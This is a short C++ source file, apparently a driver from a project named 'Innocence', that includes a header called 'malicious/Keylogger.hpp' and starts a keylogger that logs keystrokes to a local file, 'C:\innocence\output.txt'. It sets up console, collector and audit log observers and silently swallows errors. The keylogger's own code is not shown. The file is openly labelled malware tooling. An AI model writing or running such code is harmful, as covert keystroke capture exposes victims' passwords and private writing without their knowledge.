#include <log/Log.hpp>
#include <malicious/Keylogger.hpp>
#include <system/Process.hpp>
#include <common/Innocence.hpp>
#include <audit/Audit.hpp>

int submain(int argc, char ** argv)
{
	LOG.setIdentity(Common::identity);
    LOG.addObserver(new Log::LogToConsole);
    LOG.addObserver(new Log::LogToCollector);
	LOG.addObserver(new Audit::LogToAuditor);
	try
	{
		Malicious::Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
		Malicious::Keylogger::instance().start();
	}
	catch(Common::Exception&)
	{
	}
	CATCH_UNKNOWN_EXCEPTION
	system("pause");
	return EXIT_SUCCESS;
}

INNOCENCE_MAIN